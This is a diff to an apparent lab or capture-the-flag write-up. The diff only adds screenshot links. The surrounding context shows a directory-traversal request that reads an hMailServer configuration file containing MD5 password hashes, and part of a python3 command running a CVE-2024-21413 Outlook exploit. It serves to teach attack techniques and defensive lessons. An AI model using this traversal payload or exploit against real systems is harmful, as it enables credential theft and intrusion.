@@ -60,6 +60,8 @@ We craft our LFI payload:
 
 ```text
 GET /download.php?file=../../../../Program+files+(x86)/hMailServer/Bin/hMailServer.INI
+
+![Screenshot](images/Screenshot_2024-08-21_at_5.27.15_PM.png)
 ```
 
 The server returns the `.ini` file. Inside, we find two MD5 hashes:
@@ -112,6 +114,8 @@ python3 CVE-2024-21413.py \
 ## Key Takeaways
 
 - **LFI in Download Scripts:** Scripts designed to serve files (`download.php?file=`) are historically prone to directory traversal if the input is not strictly sanitized or restricted to a specific directory enclosure.
+
+![Screenshot](images/Screenshot_2024-08-21_at_5.16.58_PM.png)
 - **Client-Side Attacks:** Sometimes the vulnerability is not in the server, but in the software the employees use to read data from the server. The Moniker Link bug in Outlook allowed complete domain compromise via a single clicked link.
 
 ---
